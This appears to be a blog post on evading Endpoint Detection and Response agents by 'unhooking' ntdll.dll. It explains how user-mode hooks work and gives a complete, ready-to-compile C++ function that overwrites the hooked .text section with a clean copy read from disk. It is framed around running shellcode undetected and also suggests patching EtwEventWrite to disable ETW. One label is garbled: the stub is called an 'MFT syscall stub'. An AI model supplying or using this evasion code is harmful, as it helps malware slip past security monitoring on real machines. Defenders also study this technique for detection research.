---
title: "Bypassing Modern EDR Systems via API Unhooking"
description: "An advanced look at how Endpoint Detection and Response (EDR) agents monitor API calls using user-mode hooks, and how to bypass them by reloading clean NTDLL copies."
date: "2026-06-20"
tags: ["malware-analysis", "evasion", "windows", "security"]
category: "Evasion Techniques"
cover_image: "/images/covers/edr-bypass-cover.svg"
draft: false
---

## Understanding User-Mode EDR Hooks

Endpoint Detection and Response (EDR) systems inspect system calls to detect malicious activities. To monitor processes, most EDRs inject a DLL into every newly spawned user-mode process. This DLL inserts `hooks` (inline redirections) into critical Windows APIs—typically inside `ntdll.dll`.

When our binary calls an API like `NtCreateThreadEx` to run shellcode, the execution is redirected to the EDR’s engine for inspection before reaching the kernel.

---

## 1. How EDR Hooks Look in Memory

When `ntdll.dll` is loaded, the first few bytes of system call stubs are modified. A standard, unhooked MFT syscall stub looks like this:

```text
mov r10, rcx
mov eax, 0x18   ; syscall ID
syscall
ret
```

An hooked API is overwritten with an absolute jump (`jmp`) pointing to the EDR's monitoring DLL:

```text
jmp <EDR_Hook_Module_Address>
nop
syscall
ret
```

---

## 2. API Unhooking: Reloading NTDLL

To bypass user-mode hooks, we can map a clean, unhooked copy of `ntdll.dll` directly from disk into our process memory, overwriting the hooked `.text` section of the already loaded `ntdll.dll`.

Here is the C++ implementation to perform NTDLL unhooking:

```cpp
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <iostream>

void UnhookNtdll() {
    // 1. Get current NTDLL address
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    // 2. Read clean NTDLL from disk
    HANDLE ntdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    // 3. Locate the .text sections
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + ((DWORD_PTR)i * sizeof(IMAGE_SECTION_HEADER)));
        
        if (strcmp((char*)sectionHeader->Name, ".text") == 0) {
            DWORD oldProtect = 0;
            LPVOID lpAddress = (LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress);
            SIZE_T size = sectionHeader->Misc.VirtualSize;
            
            // 4. Overwrite hooked section with clean disk copy
            VirtualProtect(lpAddress, size, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(lpAddress, (LPVOID)((DWORD_PTR)ntdllMappingAddress + sectionHeader->VirtualAddress), size);
            VirtualProtect(lpAddress, size, oldProtect, &oldProtect);
        }
    }

    // 5. Cleanup
    UnmapViewOfFile(ntdllMappingAddress);
    CloseHandle(ntdllMapping);
    CloseHandle(ntdllFile);
}
```

By calling `UnhookNtdll()` at the entrypoint of our program, the EDR hooks in NTDLL are completely overwritten with their original, unhooked instructions. When we subsequently call Windows API functions, the calls execute directly without checking in with the EDR agent.

---

## 3. Advanced Detection Concerns

While unhooking user-mode hooks bypasses user-mode monitoring, modern EDRs also monitor processes using:
1. **Kernel Callbacks**: Registered via `ObRegisterCallbacks` and `PsSetCreateProcessNotifyRoutine`. These cannot be bypassed from user-mode.
2. **ETW (Event Tracing for Windows)**: Microsoft-Windows-Threat-Intelligence provider traces API calls. We can disable ETW by patching `EtwEventWrite` inside `ntdll.dll`.

Unhooking is a powerful technique but should be combined with other evasion tactics (like direct syscalls or sleep encryption) for comprehensive coverage.
